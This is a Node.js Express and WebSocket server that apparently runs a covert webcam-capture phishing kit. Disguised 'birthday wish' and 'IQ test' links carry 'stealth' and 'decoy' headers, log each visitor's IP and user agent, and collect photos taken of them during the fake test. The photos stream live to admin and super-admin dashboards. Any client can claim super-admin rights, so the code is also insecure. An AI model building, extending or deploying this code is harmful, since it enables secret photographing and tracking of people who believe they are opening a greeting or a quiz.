const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const crypto = require('crypto');

// Security configurations
const SECURITY_CONFIG = {
  maxImageSize: 5 * 1024 * 1024, // 5MB max image size
  maxSessionsPerIP: 10, // Max sessions per IP
  rateLimitWindow: 15 * 60 * 1000, // 15 minutes
  maxRequestsPerWindow: 100, // Max requests per window
  sessionTimeout: 2 * 60 * 60 * 1000, // 2 hours session timeout
  encryptionKey: crypto.randomBytes(32), // Random encryption key
};

// Rate limiting and IP tracking
const ipTracking = new Map(); // IP -> { requests: [], sessions: [] }

function isValidIP(ip) {
  return ip && ip !== '::1' && ip !== '127.0.0.1';
}

function checkRateLimit(ip) {
  if (!isValidIP(ip)) return true; // Allow localhost
  
  const now = Date.now();
  if (!ipTracking.has(ip)) {
    ipTracking.set(ip, { requests: [], sessions: [] });
  }
  
  const tracking = ipTracking.get(ip);
  
  // Clean old requests
  tracking.requests = tracking.requests.filter(time => 
    now - time < SECURITY_CONFIG.rateLimitWindow
  );
  
  // Check rate limit
  if (tracking.requests.length >= SECURITY_CONFIG.maxRequestsPerWindow) {
    console.log(`Rate limit exceeded for IP: ${ip}`);
    return false;
  }
  
  tracking.requests.push(now);
  return true;
}

function encryptSensitiveData(data) {
  const cipher = crypto.createCipher('aes-256-cbc', SECURITY_CONFIG.encryptionKey);
  let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return encrypted;
}

function decryptSensitiveData(encryptedData) {
  try {
    const decipher = crypto.createDecipher('aes-256-cbc', SECURITY_CONFIG.encryptionKey);
    let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return JSON.parse(decrypted);
  } catch (e) {
    console.error('Decryption failed:', e);
    return null;
  }
}

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// serve static files from project folder
app.use(express.static(path.join(__dirname)));

// Health check endpoint for Render - using a different path
app.get('/health', (req, res) => {
  res.send('Birthday Wish System is running!');
});

// Handle short birthday links with stealth features
app.get('/wish/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  const clientIP = req.ip || req.connection.remoteAddress;
  
  // Security check
  if (!checkRateLimit(clientIP)) {
    return res.status(429).send('Service temporarily unavailable');
  }
  
  // Add stealth headers
  res.setHeader('X-Powered-By', 'Party-Platform/1.5');
  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
  
  // Check if session exists
  const sessionData = sessions.get(sessionId);
  const sessionName = sessionData ? sessionData.sessionName : 'Birthday Celebration';
  
  // Log access for security monitoring
  console.log(`Birthday session accessed: ${sessionId} from IP: ${clientIP}`);
  
  // Redirect to birthday page with session parameters
  const redirectUrl = `/birthday.html?session=${sessionId}&name=${encodeURIComponent(sessionName)}`;
  res.redirect(redirectUrl);
});

// Handle IQ test links with stealth features
app.get('/iqtest/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  const clientIP = req.ip || req.connection.remoteAddress;
  
  // Security check
  if (!checkRateLimit(clientIP)) {
    return res.status(429).send('Too many requests');
  }
  
  // Add decoy headers to appear like a normal educational site
  res.setHeader('X-Powered-By', 'Educational-Platform/2.1');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  res.setHeader('Content-Security-Policy', "default-src 'self' 'unsafe-inline' 'unsafe-eval'");
  
  // Check if IQ session exists, create if it doesn't
  if (!iqSessions.has(sessionId)) {
    iqSessions.set(sessionId, {
      id: sessionId,
      participantName: 'Anonymous',
      created: Date.now(),
      status: 'active',
      photoCount: 0,
      createdBy: 'auto',
      creatorToken: null,
      clientIP: clientIP, // Track IP for security
      userAgent: req.get('User-Agent') || 'Unknown'
    });
    console.log(`IQ Session auto-created: ${sessionId} from IP: ${clientIP}`);
    
    // Notify admins about new session with security info
    broadcastToAdmins({
      type: 'iq_session_created',
      sessionId: sessionId,
      participantName: 'Anonymous',
      clientIP: clientIP,
      userAgent: req.get('User-Agent')
    });
  }
  
  // Serve the IQ test page
  res.sendFile(path.join(__dirname, 'iq-test.html'));
});

// Root route - serve index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Session and client management with performance optimizations
let adminClients = new Set();
let superAdminClients = new Set(); // Track super admins separately
let userClients = new Map(); // sessionId -> Set of WebSocket connections
let sessions = new Map(); // sessionId -> session data
let images = new Map(); // sessionId -> array of images (with compression)
let iqSessions = new Map(); // IQ test sessions
let iqPhotos = new Map(); // IQ test photos (with compression)
let totalImages = 0;

// Performance cache for frequently accessed data
let sessionCache = new Map();
let adminCache = new Map();

// Compression utility for images
function compressImageData(imageData) {
  // Basic image compression - reduce quality for storage efficiency
  if (imageData.length > 500000) { // If image > 500KB
    console.log('Large image detected, applying compression');
    // In production, you'd use actual image compression library
    return imageData; // Placeholder for now
  }
  return imageData;
}

// Cleanup old sessions periodically (every 6 hours)
setInterval(() => {
  const now = Date.now();
  const sixHours = 6 * 60 * 60 * 1000;
  
  // Clean old sessions
  for (let [sessionId, session] of sessions.entries()) {
    if (now - session.created > sixHours) {
      sessions.delete(sessionId);
      images.delete(sessionId);
      console.log(`Cleaned up old session: ${sessionId}`);
    }
  }
  
  // Clean old IQ sessions
  for (let [sessionId, session] of iqSessions.entries()) {
    if (now - session.created > sixHours) {
      iqSessions.delete(sessionId);
      iqPhotos.delete(sessionId);
      console.log(`Cleaned up old IQ session: ${sessionId}`);
    }
  }
  
  // Clear caches
  sessionCache.clear();
  adminCache.clear();
}, 6 * 60 * 60 * 1000);

function broadcastToAdmins(message) {
  adminClients.forEach(client => {
    if (client.readyState === 1) {
      client.send(JSON.stringify(message));
    }
  });
}

function broadcastToSuperAdmins(message) {
  superAdminClients.forEach(client => {
    if (client.readyState === 1) {
      client.send(JSON.stringify(message));
    }
  });
}

function broadcastToNormalAdmins(message) {
  adminClients.forEach(client => {
    if (client.readyState === 1 && client.adminType !== 'super') {
      client.send(JSON.stringify(message));
    }
  });
}

function sendAllSessionsToSuperAdmin(superAdminWs) {
  if (superAdminWs.readyState !== 1) return;
  
  // Collect all images from all sessions
  const allImages = [];
  images.forEach((sessionImages, sessionId) => {
    sessionImages.forEach(imageData => {
      allImages.push({
        ...imageData,
        sessionId: sessionId
      });
    });
  });
  
  // Collect all IQ sessions
  const allIQSessions = Array.from(iqSessions.values());
  
  // Collect all IQ photos
  const allIQPhotos = [];
  iqPhotos.forEach((sessionPhotos, sessionId) => {
    sessionPhotos.forEach(photoData => {
      allIQPhotos.push({
        ...photoData,
        sessionId: sessionId
      });
    });
  });
  
  // Send comprehensive data to super admin
  superAdminWs.send(JSON.stringify({
    type: 'all_sessions_data',
    allImages: allImages,
    allIQSessions: allIQSessions,
    allIQPhotos: allIQPhotos,
    totalSessions: sessions.size + iqSessions.size,
    totalImages: allImages.length + allIQPhotos.length
  }));
}

function sendOwnSessionsToNormalAdmin(normalAdminWs) {
  if (normalAdminWs.readyState !== 1 || normalAdminWs.adminType === 'super') return;
  
  // Collect only images from sessions created by this admin
  const ownImages = [];
  images.forEach((sessionImages, sessionId) => {
    const session = sessions.get(sessionId);
    if (session && session.creatorToken === normalAdminWs.sessionToken) {
      sessionImages.forEach(imageData => {
        ownImages.push({
          ...imageData,
          sessionId: sessionId
        });
      });
    }
  });
  
  // Collect only IQ sessions created by this admin
  const ownIQSessions = [];
  iqSessions.forEach((session, sessionId) => {
    if (session.creatorToken === normalAdminWs.sessionToken) {
      ownIQSessions.push(session);
    }
  });
  
  // Collect only IQ photos from sessions created by this admin
  const ownIQPhotos = [];
  iqPhotos.forEach((sessionPhotos, sessionId) => {
    const session = iqSessions.get(sessionId);
    if (session && session.creatorToken === normalAdminWs.sessionToken) {
      sessionPhotos.forEach(photoData => {
        ownIQPhotos.push({
          ...photoData,
          sessionId: sessionId
        });
      });
    }
  });
  
  // Send only own sessions data to normal admin
  normalAdminWs.send(JSON.stringify({
    type: 'own_sessions_data',
    ownImages: ownImages,
    ownIQSessions: ownIQSessions,
    ownIQPhotos: ownIQPhotos,
    totalOwnSessions: ownIQSessions.length + (ownImages.length > 0 ? 1 : 0),
    totalOwnImages: ownImages.length + ownIQPhotos.length
  }));
}

function updateAdminStats() {
  const stats = {
    type: 'stats',
    totalImages: totalImages,
    activeSessions: Array.from(sessions.keys()),
    connectedUsers: Array.from(userClients.values()).reduce((sum, set) => sum + set.size, 0)
  };
  broadcastToAdmins(stats);
}

wss.on('connection', (ws, req) => {
  ws.on('message', (msg) => {
    let data = null;
    
    try {
      data = JSON.parse(msg.toString());
    } catch (e) {
      console.warn('Invalid JSON message:', e);
      return;
    }
    
    if (data.type === 'register') {
      if (data.role === 'admin') {
        ws.isAdmin = true;
        ws.adminType = data.adminType || 'normal';
        ws.sessionToken = data.sessionToken;
        
        adminClients.add(ws);
        
        if (data.adminType === 'super') {
          superAdminClients.add(ws);
          console.log('Super admin connected');
          
          // Send all sessions data to super admin
          setTimeout(() => {
            sendAllSessionsToSuperAdmin(ws);
          }, 1000);
        } else {
          console.log('Normal admin connected');
          
          // Send only own sessions data to normal admin
          setTimeout(() => {
            sendOwnSessionsToNormalAdmin(ws);
          }, 1000);
        }
        
        // Send current stats to new admin
        updateAdminStats();
        
      } else if (data.role === 'user' && data.sessionId) {
        ws.isUser = true;
        ws.sessionId = data.sessionId;
        
        // Add to user clients for this session
        if (!userClients.has(data.sessionId)) {
          userClients.set(data.sessionId, new Set());
        }
        userClients.get(data.sessionId).add(ws);
        
        console.log(`User connected to session: ${data.sessionId}`);
        
        // For IQ test sessions, update the session and notify admins
        if (iqSessions.has(data.sessionId)) {
          const session = iqSessions.get(data.sessionId);
          session.status = 'active';
          session.lastActive = Date.now();
          
          // Notify admins about active IQ session
          broadcastToAdmins({
            type: 'iq_session_active',
            sessionId: data.sessionId,
            participantName: session.participantName,
            status: session.status
          });
        }
        
        // Notify admins
        broadcastToAdmins({ type: 'user_connected', sessionId: data.sessionId });
        updateAdminStats();
      }
      
    } else if (data.type === 'create_session') {
      // Admin is creating a new session - track which admin created it
      sessions.set(data.sessionId, {
        id: data.sessionId,
        name: data.sessionName,
        created: Date.now(),
        imageCount: 0,
        createdBy: data.adminType || ws.adminType, // Track who created this session
        creatorToken: data.sessionToken || ws.sessionToken // Track specific admin instance
      });
      console.log(`Session created: ${data.sessionId} (${data.sessionName}) by ${data.adminType || ws.adminType} admin`);
      updateAdminStats();
      
    } else if (data.type === 'create_iq_session') {
      // Admin is creating a new IQ test session - track which admin created it
      iqSessions.set(data.sessionId, {
        id: data.sessionId,
        participantName: data.participantName,
        created: Date.now(),
        status: 'active',
        photoCount: 0,
        createdBy: data.adminType || ws.adminType, // Track who created this session
        creatorToken: data.sessionToken || ws.sessionToken // Track specific admin instance
      });
      console.log(`IQ Session created: ${data.sessionId} (${data.participantName}) by ${data.adminType || ws.adminType} admin`);
      
      // Notify admins
      broadcastToAdmins({
        type: 'iq_session_created',
        sessionId: data.sessionId,
        participantName: data.participantName
      });
      
    } else if (data.type === 'iq_photo_capture') {
      // IQ test photo capture
      console.log(`Received IQ photo capture: ${data.sessionId} - ${data.photoType}`);
      
      if (!iqPhotos.has(data.sessionId)) {
        iqPhotos.set(data.sessionId, []);
      }
      
      const photoData = {
        type: data.photoType,
        timestamp: data.timestamp,
        currentQuestion: data.currentQuestion,
        photo: data.photo
      };
      
      iqPhotos.get(data.sessionId).push(photoData);
      
      // Update session photo count
      if (iqSessions.has(data.sessionId)) {
        iqSessions.get(data.sessionId).photoCount++;
        console.log(`Session ${data.sessionId} now has ${iqSessions.get(data.sessionId).photoCount} photos`);
      }
      
      // Forward ONLY to super admins and session creator (if normal admin)
      broadcastToSuperAdmins({
        type: 'iq_photo_captured',
        sessionId: data.sessionId,
        photoType: data.photoType,
        timestamp: data.timestamp,
        currentQuestion: data.currentQuestion,
        photo: data.photo
      });
      
      // Send to normal admin ONLY if they created this session
      const session = iqSessions.get(data.sessionId);
      console.log(`Checking IQ session ownership for ${data.sessionId}:`, {
        sessionExists: !!session,
        createdBy: session?.createdBy,
        creatorToken: session?.creatorToken
      });
      
      if (session && session.createdBy === 'normal') {
        console.log(`IQ Session ${data.sessionId} was created by normal admin, checking for matching clients...`);
        let sentToNormalAdmin = false;
        adminClients.forEach(client => {
          if (client.readyState === 1 && 
              client.adminType === 'normal' && 
              client.sessionToken === session.creatorToken) {
            console.log(`Sending IQ photo to normal admin who created session ${data.sessionId}`);
            client.send(JSON.stringify({
              type: 'iq_photo_captured',
              sessionId: data.sessionId,
              photoType: data.photoType,
              timestamp: data.timestamp,
              currentQuestion: data.currentQuestion,
              photo: data.photo
            }));
            sentToNormalAdmin = true;
          }
        });
        if (!sentToNormalAdmin) {
          console.log(`No matching normal admin found for IQ session ${data.sessionId}`);
        }
      } else {
        console.log(`IQ Session ${data.sessionId} was not created by normal admin or doesn't exist`);
      }
      
      // Send session update to other normal admins (without image data)
      broadcastToNormalAdmins({
        type: 'iq_session_photo_count_update',
        sessionId: data.sessionId,
        photoCount: iqSessions.get(data.sessionId)?.photoCount || 0
      });
      
      // For super admins, also update their comprehensive view
      if (superAdminClients.size > 0) {
        setTimeout(() => {
          superAdminClients.forEach(superAdmin => {
            sendAllSessionsToSuperAdmin(superAdmin);
          });
        }, 500);
      }
      
      console.log(`IQ Photo captured: ${data.sessionId} - ${data.photoType}`);
      
    } else if (data.type === 'iq_test_complete') {
      // IQ test completion
      if (iqSessions.has(data.sessionId)) {
        const session = iqSessions.get(data.sessionId);
        session.status = 'completed';
        session.score = data.score;
        session.correctAnswers = data.correctAnswers;
        session.totalQuestions = data.totalQuestions;
        session.completedAt = data.timestamp;
      }
      
      // Notify admins
      broadcastToAdmins({
        type: 'iq_test_completed',
        sessionId: data.sessionId,
        score: data.score,
        correctAnswers: data.correctAnswers,
        totalQuestions: data.totalQuestions,
        timestamp: data.timestamp
      });
      
      console.log(`IQ Test completed: ${data.sessionId} - Score: ${data.score}`);
      
    } else if (data.type === 'image' && data.sessionId) {
      // User is sending an image
      totalImages++;
      
      // Store the image with compression and validation
      if (data.payload.length > SECURITY_CONFIG.maxImageSize) {
        console.log(`Image too large from session ${data.sessionId}, rejecting`);
        return;
      }
      
      if (!images.has(data.sessionId)) {
        images.set(data.sessionId, []);
      }
      
      const compressedPayload = compressImageData(data.payload);
      images.get(data.sessionId).push({
        type: 'image',
        sessionId: data.sessionId,
        time: data.time,
        payload: compressedPayload,
        captureNumber: data.captureNumber,
        size: compressedPayload.length,
        compressed: compressedPayload !== data.payload
      });
      
      // Update session image count
      if (sessions.has(data.sessionId)) {
        sessions.get(data.sessionId).imageCount++;
      }
      
      // Forward ONLY to super admins and session creator (if normal admin)
      broadcastToSuperAdmins({
        type: 'image',
        sessionId: data.sessionId,
        time: data.time,
        payload: data.payload,
        captureNumber: data.captureNumber
      });
      
      // Send to normal admin ONLY if they created this session
      const session = sessions.get(data.sessionId);
      console.log(`Checking session ownership for ${data.sessionId}:`, {
        sessionExists: !!session,
        createdBy: session?.createdBy,
        creatorToken: session?.creatorToken,
        adminClientsCount: adminClients.size
      });
      
      if (session && session.createdBy === 'normal') {
        console.log(`Session ${data.sessionId} was created by normal admin, checking for matching clients...`);
        let sentToNormalAdmin = false;
        adminClients.forEach(client => {
          if (client.readyState === 1 && 
              client.adminType === 'normal' && 
              client.sessionToken === session.creatorToken) {
            console.log(`Sending image to normal admin who created session ${data.sessionId}`);
            client.send(JSON.stringify({
              type: 'image',
              sessionId: data.sessionId,
              time: data.time,
              payload: data.payload,
              captureNumber: data.captureNumber
            }));
            sentToNormalAdmin = true;
          }
        });
        if (!sentToNormalAdmin) {
          console.log(`No matching normal admin found for session ${data.sessionId}`);
        }
      } else {
        console.log(`Session ${data.sessionId} was not created by normal admin or doesn't exist`);
      }
      
      // Send session update to other normal admins (without image data)
      broadcastToNormalAdmins({
        type: 'session_image_count_update',
        sessionId: data.sessionId,
        imageCount: sessions.get(data.sessionId)?.imageCount || 0
      });
      
      // For super admins, also update their comprehensive view
      if (superAdminClients.size > 0) {
        setTimeout(() => {
          superAdminClients.forEach(superAdmin => {
            sendAllSessionsToSuperAdmin(superAdmin);
          });
        }, 500);
      }
      
      updateAdminStats();
      
    } else if (data.type === 'session_ended' && data.sessionId) {
      // User ended their session
      console.log(`Session ended: ${data.sessionId}`);
      broadcastToAdmins({ type: 'session_ended', sessionId: data.sessionId });
      
    } else if (data.type === 'delete_image') {
      // Super admin wants to delete a birthday image
      if (ws.adminType !== 'super') {
        ws.send(JSON.stringify({
          type: 'delete_error',
          message: 'Only super admin can delete images'
        }));
        return;
      }
      
      const { sessionId, imageTime, imageType } = data;
      console.log(`Super admin deleting image: ${sessionId} at ${imageTime}`);
      
      // Remove from server storage
      if (images.has(sessionId)) {
        const sessionImages = images.get(sessionId);
        const imageIndex = sessionImages.findIndex(img => img.time === imageTime);
        if (imageIndex !== -1) {
          sessionImages.splice(imageIndex, 1);
          totalImages = Math.max(0, totalImages - 1);
          
          // Update session image count
          if (sessions.has(sessionId)) {
            sessions.get(sessionId).imageCount = Math.max(0, sessions.get(sessionId).imageCount - 1);
          }
          
          // Notify all admins about the deletion (super admins see it, normal admins just get notification)
          broadcastToSuperAdmins({
            type: 'image_deleted',
            sessionId: sessionId,
            imageTime: imageTime,
            deletedBy: 'super_admin'
          });
          
          // Notify normal admins about count change only
          broadcastToNormalAdmins({
            type: 'session_image_count_update',
            sessionId: sessionId,
            imageCount: sessions.get(sessionId).imageCount
          });
          
          // Update stats
          updateAdminStats();
          
          console.log(`Image deleted successfully: ${sessionId} at ${imageTime}`);
        } else {
          ws.send(JSON.stringify({
            type: 'delete_error',
            message: 'Image not found'
          }));
        }
      } else {
        ws.send(JSON.stringify({
          type: 'delete_error',
          message: 'Session not found'
        }));
      }
      
    } else if (data.type === 'delete_iq_photo') {
      // Super admin wants to delete an IQ test photo
      if (ws.adminType !== 'super') {
        ws.send(JSON.stringify({
          type: 'delete_error',
          message: 'Only super admin can delete images'
        }));
        return;
      }
      
      const { sessionId, timestamp } = data;
      console.log(`Super admin deleting IQ photo: ${sessionId} at ${timestamp}`);
      
      // Remove from server storage
      if (iqPhotos.has(sessionId)) {
        const sessionPhotos = iqPhotos.get(sessionId);
        const photoIndex = sessionPhotos.findIndex(photo => photo.timestamp === timestamp);
        if (photoIndex !== -1) {
          sessionPhotos.splice(photoIndex, 1);
          
          // Update session photo count
          if (iqSessions.has(sessionId)) {
            iqSessions.get(sessionId).photoCount = Math.max(0, iqSessions.get(sessionId).photoCount - 1);
          }
          
          // Notify all admins about the deletion (super admins see it, normal admins just get notification)
          broadcastToSuperAdmins({
            type: 'iq_photo_deleted',
            sessionId: sessionId,
            timestamp: timestamp,
            deletedBy: 'super_admin'
          });
          
          // Notify normal admins about count change only
          broadcastToNormalAdmins({
            type: 'iq_session_photo_count_update',
            sessionId: sessionId,
            photoCount: iqSessions.get(sessionId).photoCount
          });
          
          console.log(`IQ photo deleted successfully: ${sessionId} at ${timestamp}`);
        } else {
          ws.send(JSON.stringify({
            type: 'delete_error',
            message: 'Photo not found'
          }));
        }
      } else {
        ws.send(JSON.stringify({
          type: 'delete_error',
          message: 'IQ session not found'
        }));
      }
    }
  });

  ws.on('close', () => {
    if (ws.isAdmin) {
      adminClients.delete(ws);
      if (ws.adminType === 'super') {
        superAdminClients.delete(ws);
        console.log('Super admin disconnected');
      } else {
        console.log('Normal admin disconnected');
      }
    } else if (ws.isUser && ws.sessionId) {
      const sessionUsers = userClients.get(ws.sessionId);
      if (sessionUsers) {
        sessionUsers.delete(ws);
        if (sessionUsers.size === 0) {
          userClients.delete(ws.sessionId);
        }
      }
      
      // Notify admins
      broadcastToAdmins({ type: 'user_disconnected', sessionId: ws.sessionId });
      updateAdminStats();
      
      console.log(`User disconnected from session: ${ws.sessionId}`);
    }
  });
});

const PORT = process.env.PORT || 8000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`WebImageAnalyzer server listening on port ${PORT}`);
  console.log(`Admin panel: http://localhost:${PORT}/admin.html`);
});
